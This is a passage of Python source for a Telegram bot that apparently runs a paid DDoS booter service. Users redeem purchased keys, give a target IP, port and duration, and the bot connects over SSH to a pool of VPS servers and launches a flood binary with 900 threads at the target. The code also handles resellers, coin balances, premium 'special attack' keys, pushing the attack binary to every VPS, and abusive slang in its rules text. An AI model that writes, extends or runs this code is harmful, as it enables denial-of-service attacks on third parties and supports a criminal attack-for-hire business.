    elif duration <= 60:
        threads = 900
    elif duration <= 120:
        threads = 900
    else:  # For special attacks >120s
        threads = 900

    # Check if we have any VPS available (don't show details)
    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    selected_vps_ips = [vps[0] for vps in VPS_LIST if vps[0] not in busy_vps]
    
    if not selected_vps_ips:
        await update.message.reply_text(
            f"❌ *No servers available! All servers are currently busy.*\n\n"
            f"Please try again later.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    user_id = update.effective_user.id
    is_special = False
    
    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
            is_special = True
    
    if duration > max_duration and not is_special:
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"❌ *Attack duration exceeds 120 seconds!*\n"
            f"🔑 *For 200 seconds attacks, you need a special key.*\n\n"
            f"👑 *Buy keys from:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration

    if duration > max_allowed_duration:
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"❌ *Attack duration exceeds the max limit ({max_allowed_duration} sec)!*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    last_attack_time = time.time()
    
    attack_id = f"{ip}:{port}-{time.time()}"
    running_attacks[attack_id] = {
        'user_id': user_id,
        'start_time': time.time(),
        'duration': duration,
        'is_special': is_special,
        'vps_ips': selected_vps_ips,
        'threads': threads
    }

    attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"{attack_type}\n"
        f"🎯 *Target*: {ip}:{port}\n"
        f"🕒 *Duration*: {duration} sec\n"
        f"🧵 *Threads*: {threads}\n"
        f"🖥️ *Servers*: {len(selected_vps_ips)}\n"
        f"👑 *Bot Owner:* {current_display_name}\n\n"
        f"🔥 *Attack launched on all available servers!*",
        parse_mode='Markdown'
    )

    async def run_attack_on_vps(vps_ip):
        try:
            selected_vps = None
            for vps in VPS_LIST:
                if vps[0] == vps_ip:
                    selected_vps = vps
                    break
            
            if selected_vps:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(selected_vps[0], username=selected_vps[1], password=selected_vps[2], timeout=10)
                    
                    command = f"{BINARY_PATH} {ip} {port} {duration} {random.randint(512, 1024)} {threads} 0"
                    stdin, stdout, stderr = ssh.exec_command(command)
                    
                    start_time = time.time()
                    while time.time() - start_time < duration + 15:
                        if stdout.channel.exit_status_ready():
                            break
                        await asyncio.sleep(1)
                    
                    ssh.close()
                    return (vps_ip, True, None)
                except Exception as e:
                    logging.error(f"Error executing attack on VPS {selected_vps[0]}: {str(e)}")
                    return (vps_ip, False, str(e))
            else:
                return (vps_ip, False, "VPS details not found")
        except Exception as e:
            logging.error(f"Error connecting to VPS {vps_ip}: {str(e)}")
            return (vps_ip, False, str(e))

    async def run_attack():
        attack_tasks = [run_attack_on_vps(vps_ip) for vps_ip in selected_vps_ips]
        results = await asyncio.gather(*attack_tasks)
        
        if attack_id in running_attacks:
            del running_attacks[attack_id]

        success_count = sum(1 for result in results if result[1])
        fail_count = len(results) - success_count
        
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"📊 *Attack Completed!*\n"
            f"🎯 *Target*: {ip}:{port}\n"
            f"🕒 *Duration*: {duration} sec\n"
            f"🧵 *Threads*: {threads}\n"
            f"✅ *Successful servers*: {success_count}\n"
            f"❌ *Failed servers*: {fail_count}\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n\n"
            f"🔥 *Attack finished on all servers!*",
            parse_mode='Markdown'
        )

    asyncio.create_task(run_attack())
    return ConversationHandler.END

async def set_cooldown_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can set cooldown!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the global cooldown duration in seconds.*", parse_mode='Markdown')
    return GET_SET_COOLDOWN

async def set_cooldown_input(update: Update, context: CallbackContext):
    global global_cooldown

    try:
        global_cooldown = int(update.message.text)
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ *Global cooldown set to {global_cooldown} seconds!*\n\n",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

async def show_keys(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner, co-owners or resellers can view keys!*", parse_mode='Markdown')
        return

    current_time = time.time()
    active_keys = []
    active_special_keys = []
    redeemed_keys = []
    expired_keys = []

    for key, key_info in keys.items():
        if key_info['expiration_time'] > current_time:
            remaining_time = key_info['expiration_time'] - current_time
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time % 3600) // 60)
            
            generated_by_username = "Unknown"
            if key_info['generated_by']:
                try:
                    chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = escape_markdown(chat.username or "NoUsername", version=2) if chat.username else "NoUsername"
                except Exception:
                    generated_by_username = "Unknown"
                    
            active_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Expires in {hours}h {minutes}m)")
        else:
            expired_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Expired)")

    for key, key_info in special_keys.items():
        if key_info['expiration_time'] > current_time:
            remaining_time = key_info['expiration_time'] - current_time
            days = int(remaining_time // 86400)
            hours = int((remaining_time % 86400) // 3600)
            
            generated_by_username = "Unknown"
            if key_info['generated_by']:
                try:
                    chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = escape_markdown(chat.username or "NoUsername", version=2) if chat.username else "NoUsername"
                except Exception:
                    generated_by_username = "Unknown"
                    
            active_special_keys.append(f"💎 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Expires in {days}d {hours}h)")

    for key, key_info in redeemed_keys_info.items():
        if key_info['redeemed_by'] in redeemed_users:
            redeemed_by_username = "Unknown"
            generated_by_username = "Unknown"
            
            try:
                redeemed_chat = await context.bot.get_chat(key_info['redeemed_by'])
                redeemed_by_username = escape_markdown(redeemed_chat.username or "NoUsername", version=2) if redeemed_chat.username else "NoUsername"
                
                if key_info['generated_by']:
                    generated_chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = escape_markdown(generated_chat.username or "NoUsername", version=2) if generated_chat.username else "NoUsername"
            except Exception:
                pass
            
            if 'is_special' in key_info and key_info['is_special']:
                redeemed_keys.append(f"💎 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Redeemed by @{redeemed_by_username})")
            else:
                redeemed_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Redeemed by @{redeemed_by_username})")

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    message = (
        "*🗝️ Active Regular Keys:*\n" + ("\n".join(active_keys) + "\n\n" if active_keys else "No active regular keys found.\n\n") +
        "*💎 Active Special Keys:*\n" + ("\n".join(active_special_keys) + "\n\n" if active_special_keys else "No active special keys found.\n\n") +
        "*🗝️ Redeemed Keys:*\n" + ("\n".join(redeemed_keys) + "\n\n" if redeemed_keys else "No redeemed keys found.\n\n") +
        "*🗝️ Expired Keys:*\n" + ("\n".join(expired_keys) if expired_keys else "No expired keys found.") +
        f"\n\n👑 *Bot Owner:* PAPA KA BOT"
    )

    await update.message.reply_text(message, parse_mode='Markdown')

async def set_duration_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can set max attack duration!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum attack duration in seconds.*", parse_mode='Markdown')
    return GET_SET_DURATION

async def set_duration_input(update: Update, context: CallbackContext):
    global max_duration
    try:
        max_duration = int(update.message.text)
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ *Maximum attack duration set to {max_duration} seconds!*\n\n",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

async def set_threads_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can set max threads!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum number of threads.*", parse_mode='Markdown')
    return GET_SET_THREADS

async def set_threads_input(update: Update, context: CallbackContext):
    global MAX_THREADS
    try:
        MAX_THREADS = int(update.message.text)
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ *Maximum threads set to {MAX_THREADS}!*\n\n",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

async def delete_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can delete keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the key to delete.*", parse_mode='Markdown')
    return GET_DELETE_KEY

async def delete_key_input(update: Update, context: CallbackContext):
    key = update.message.text

    if key in keys:
        del keys[key]
        await update.message.reply_text(f"✅ *Key `{key}` deleted successfully!*", parse_mode='Markdown')
    elif key in special_keys:
        del special_keys[key]
        await update.message.reply_text(f"✅ *Special Key `{key}` deleted successfully!*", parse_mode='Markdown')
    elif key in redeemed_keys_info:
        user_id = redeemed_keys_info[key]['redeemed_by']
        if isinstance(redeemed_users.get(user_id), dict):
            del redeemed_users[user_id]
        else:
            del redeemed_users[user_id]
        del redeemed_keys_info[key]
        await update.message.reply_text(f"✅ *Redeemed key `{key}` deleted successfully!*", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ *Key not found!*", parse_mode='Markdown')

    save_keys()
    return ConversationHandler.END

async def add_reseller_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can add resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_RESELLER_ID

async def add_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        resellers.add(user_id)
        reseller_balances[user_id] = 0
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(f"✅ *Reseller with ID {user_id} added successfully!*\n\n👑 *Bot Owner:* ", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def remove_reseller_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can remove resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller to remove.*", parse_mode='Markdown')
    return GET_REMOVE_RESELLER_ID

async def remove_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            resellers.remove(user_id)
            if user_id in reseller_balances:
                del reseller_balances[user_id]
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(f"✅ *Reseller with ID {user_id} removed successfully!*\n\n👑 *Bot Owner:*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def add_coin_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can add coins!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_ADD_COIN_USER_ID

async def add_coin_user_id(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            context.user_data['add_coin_user_id'] = user_id
            await update.message.reply_text("⚠️ *Enter the amount of coins to add.*", parse_mode='Markdown')
            return GET_ADD_COIN_AMOUNT
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def add_coin_amount(update: Update, context: CallbackContext):
    amount_str = update.message.text

    try:
        amount = int(amount_str)
        user_id = context.user_data['add_coin_user_id']
        if user_id in reseller_balances:
            reseller_balances[user_id] += amount
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ *Added {amount} coins to reseller {user_id}. New balance: {reseller_balances[user_id]}*\n\n",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid amount! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def balance(update: Update, context: CallbackContext):
    if not is_reseller(update):
        await update.message.reply_text("❌ *Only resellers can check their balance!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    balance = reseller_balances.get(user_id, 0)
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"💰 *Your current balance is: {balance} coins*\n\n",
        parse_mode='Markdown'
    )

async def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in feedback_waiting:
        del feedback_waiting[user_id]
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            "✅ *Thanks for your feedback!*\n\n",
            parse_mode='Markdown'
        )

async def check_key_status(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    current_time = time.time()
    current_display_name = get_display_name(update.effective_chat.id)

    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict):
            if redeemed_users[user_id]['expiration_time'] <= current_time:
                status = "🔴 Expired"
            else:
                remaining_time = redeemed_users[user_id]['expiration_time'] - current_time
                days = int(remaining_time // 86400)
                hours = int((remaining_time % 86400) // 3600)
                status = f"🟢 Running ({days}d {hours}h remaining)"
            
            key_info = None
            for key, info in redeemed_keys_info.items():
                if info['redeemed_by'] == user_id and info.get('is_special'):
                    key_info = key
                    break
            
            await update.message.reply_text(
                f"🔍 *Special Key Status*\n\n"
                f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                f"🆔 *ID:* `{user_id}`\n"
                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
                f"⏳ *Status:* {status}\n"
                f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
                f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
                f"👑 *Bot Owner:* {current_display_name}",
                parse_mode='Markdown'
            )
        elif isinstance(redeemed_users[user_id], (int, float)):
            if redeemed_users[user_id] <= current_time:
                status = "🔴 Expired"
            else:
                remaining_time = redeemed_users[user_id] - current_time
                hours = int(remaining_time // 3600)
                minutes = int((remaining_time % 3600) // 60)
                status = f"🟢 Running ({hours}h {minutes}m remaining)"
            
            key_info = None
            for key, info in redeemed_keys_info.items():
                if info['redeemed_by'] == user_id:
                    key_info = key
                    break
            
            await update.message.reply_text(
                f"🔍 *Key Status*\n\n"
                f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                f"🆔 *ID:* `{user_id}`\n"
                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
                f"⏳ *Status:* {status}\n\n"
                f"👑 *Bot Owner:* {current_display_name}",
                parse_mode='Markdown'
            )
    else:
        await update.message.reply_text(
            f"🔍 *Key Status*\n\n"
            f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
            f"🆔 *ID:* `{user_id}`\n\n"
            f"❌ *No active key found!*\n"
            f"ℹ️ *Use the Redeem Key button to activate your access.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )

async def add_vps_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can add VPS!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "⚠️ Enter VPS details in format:\n\n"
        "<ip> <username> <password>\n\n"
        "Example: 1.1.1.1 root password123",
        parse_mode='Markdown'
    )
    return GET_VPS_INFO

async def add_vps_info(update: Update, context: CallbackContext):
    try:
        ip, username, password = update.message.text.split()
        VPS_LIST.append([ip, username, password])
        save_vps()
        
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"✅ VPS added successfully!\n\n"
            f"IP: `{ip}`\n"
            f"Username: `{username}`\n"
            f"Password: `{password}`\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid format! Please use:\n\n"
            "<ip> <username> <password>",
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END

async def remove_vps_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can remove VPS!", parse_mode='Markdown')
        return ConversationHandler.END
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS available to remove!", parse_mode='Markdown')
        return ConversationHandler.END
    
    vps_list_text = "\n".join(
        f"{i+1}. IP: `{vps[0]}`, User: `{vps[1]}`" 
        for i, vps in enumerate(VPS_LIST))
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ Select VPS to remove by number:\n\n{vps_list_text}\n\n",
        parse_mode='Markdown'
    )
    return GET_VPS_TO_REMOVE

async def remove_vps_selection(update: Update, context: CallbackContext):
    try:
        selection = int(update.message.text) - 1
        if 0 <= selection < len(VPS_LIST):
            removed_vps = VPS_LIST.pop(selection)
            save_vps()
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ VPS removed successfully!\n\n"
                f"IP: `{removed_vps[0]}`\n"
                f"Username: `{removed_vps[1]}`\n\n",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    
    return ConversationHandler.END

async def upload_binary_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can upload binary!", parse_mode='Markdown')
        return ConversationHandler.END
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS available to upload binary!", parse_mode='Markdown')
        return ConversationHandler.END
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        "⚠️ Please upload the binary file you want to distribute to all VPS.\n\n"
        "The file will be uploaded to /home/master/ and made executable.\n\n",
        parse_mode='Markdown'
    )
    return CONFIRM_BINARY_UPLOAD

async def upload_binary_confirm(update: Update, context: CallbackContext):
    if not update.message.document:
        await update.message.reply_text("❌ Please upload a file!", parse_mode='Markdown')
        return ConversationHandler.END
    
    # Get the file
    file = await context.bot.get_file(update.message.document)
    file_name = update.message.document.file_name
    
    # Download the file locally first
    download_path = f"./{file_name}"
    await file.download_to_drive(download_path)
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    message = await update.message.reply_text(
        f"⏳ Starting {file_name} binary upload to all VPS...\n\n",
        parse_mode='Markdown'
    )
    
    success_count = 0
    fail_count = 0
    results = []
    
    for i, vps in enumerate(VPS_LIST):
        ip, username, password = vps
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            # Define the target directory (ONLY /home/master/)
            target_dir = "/home/master/"
            target_path = f"{target_dir}{file_name}"
            
            try:
                # Upload binary to /home/master/
                with SCPClient(ssh.get_transport()) as scp:
                    scp.put(download_path, target_path)
                
                # Make binary executable (chmod +x)
                ssh.exec_command(f'chmod +x {target_path}')
                
                # Verify upload
                stdin, stdout, stderr = ssh.exec_command(f'ls -la {target_path}')
                if file_name not in stdout.read().decode():
                    raise Exception("Upload verification failed")
                
                results.append(f"✅ {i+1}. {ip} - Success (Uploaded to {target_path})")
                success_count += 1
                
            except Exception as e:
                results.append(f"❌ {i+1}. {ip} - Failed: {str(e)}")
                fail_count += 1
            
            ssh.close()
            
        except Exception as e:
            results.append(f"❌ {i+1}. {ip} - Connection Failed: {str(e)}")
            fail_count += 1
    
    # Remove the downloaded file
    os.remove(download_path)
    
    # Send results
    result_text = "\n".join(results)
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await message.edit_text(
        f"📤 {file_name} Binary Upload Results:\n\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {fail_count}\n\n"
        f"{result_text}\n\n",
        parse_mode='Markdown'
    )
    
    return ConversationHandler.END

async def show_vps_status(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can view VPS status!", parse_mode='Markdown')
        return
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS configured!", parse_mode='Markdown')
        return
    
    # Send initial message
    message = await update.message.reply_text("🔄 Checking VPS statuses...", parse_mode='Markdown')
    
    status_messages = []
    online_vps = 0
    offline_vps = 0
    busy_vps = 0
    
    # Get list of busy VPS
    busy_vps_ips = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for i, vps in enumerate(VPS_LIST):
        # Handle case where VPS entry might not have all 3 elements
        if len(vps) < 3:
            # Skip malformed entries or fill with defaults
            ip = vps[0] if len(vps) > 0 else "Unknown"
            username = vps[1] if len(vps) > 1 else "Unknown"
            password = vps[2] if len(vps) > 2 else "Unknown"
        else:
            ip, username, password = vps
            
        try:
            # Create SSH connection with short timeout
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            # Determine status
            if ip in busy_vps_ips:
                status = "🟡 Busy (Running Attack)"
                busy_vps += 1
            else:
                status = "🟢 Online"
                online_vps += 1
            
            # Check binary status
            stdin, stdout, stderr = ssh.exec_command(f'ls -la /home/master/{BINARY_NAME} 2>/dev/null || echo "Not found"')
            output = stdout.read().decode().strip()
            
            if "Not found" in output:
                binary_status = "❌ Binary not found"
            else:
                # Check binary version
                stdin, stdout, stderr = ssh.exec_command(f'/home/master/{BINARY_NAME} --version 2>&1 || echo "Error executing"')
                version_output = stdout.read().decode().strip()
                
                if "Error executing" in version_output:
                    binary_status = "✅ Binary working"
                else:
                    binary_status = f"✅ Working (Version: {version_output.split()[0] if version_output else 'Unknown'})"
            
            ssh.close()
            
            status_msg = (
                f"🔹 *VPS {i+1} Status*\n"
                f"{status}\n"
                f"IP: `{ip}`\n"
                f"User: `{username}`\n"
                f"Binary: {binary_status}\n"
            )
            status_messages.append(status_msg)
            
        except Exception as e:
            status_msg = (
                f"🔹 *VPS {i+1} Status*\n"
                f"🔴 *Offline/Error*\n"
                f"IP: `{ip}`\n"
                f"User: `{username}`\n"
                f"Error: `{str(e)}`\n"
            )
            status_messages.append(status_msg)
            offline_vps += 1
    
    # Create summary
    summary = (
        f"\n📊 *VPS Status Summary*\n"
        f"🟢 Online: {online_vps}\n"
        f"🟡 Busy: {busy_vps}\n"
        f"🔴 Offline: {offline_vps}\n"
        f"Total: {len(VPS_LIST)}\n\n"
        f"👑 *Bot Owner:* {get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)}"
    )
    
    # Combine all messages
    full_message = summary + "\n\n" + "\n".join(status_messages)
    
    # Edit the original message with the results
    try:
        await message.edit_text(full_message, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        # If message is too long, send as new messages
        if len(full_message) > 4000:
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='Markdown')
        else:
            await update.message.reply_text(full_message, parse_mode='Markdown')

async def rules(update: Update, context: CallbackContext):
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    rules_text = (
        "📜 *Rules:*\n\n"
        "1. Do not spam the bot.\n\n"
        "2. Only use the bot in the allowed group.\n\n"
        "3. Do not share your keys with others.\n\n"
        "4. Follow the instructions carefully.\n\n"
        "5. Respect other users and the bot owner.\n\n"
        "6. Any violation of these rules will result key ban with no refund.\n\n\n"
        "BSDK RULES FOLLOW KRNA WARNA GND MAR DUNGA.\n\n"
        "JO BHI KI MAKI CHUT PHAADKE SS DEGA USSE EXTRA KEY DUNGA.\n\n"

    )
    await update.message.reply_text(rules_text, parse_mode='Markdown')

async def add_group_id_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can add group IDs!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the group ID to add to allowed list (include the - sign for negative IDs):*", parse_mode='Markdown')
    return ADD_GROUP_ID

async def add_group_id_input(update: Update, context: CallbackContext):
    try:
        group_id = int(update.message.text)
        if group_id not in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.append(group_id)
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ *Group ID {group_id} added successfully!*\n\n"
                f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"ℹ️ *Group ID {group_id} is already in the allowed list.*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def remove_group_id_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can remove group IDs!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ *Enter the group ID to remove from allowed list.*\n\n"
        f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
        parse_mode='Markdown'
    )
    return REMOVE_GROUP_ID

async def remove_group_id_input(update: Update, context: CallbackContext):
    try:
        group_id = int(update.message.text)
        if group_id in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.remove(group_id)
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ *Group ID {group_id} removed successfully!*\n\n"
                f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"❌ *Group ID {group_id} not found in allowed list!*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def show_menu(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can access this menu!*", parse_mode='Markdown')
        return
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    if is_owner(update):
        await update.message.reply_text(
            f"📋 *Owner Menu* - Select an option:\n\n",
            parse_mode='Markdown',
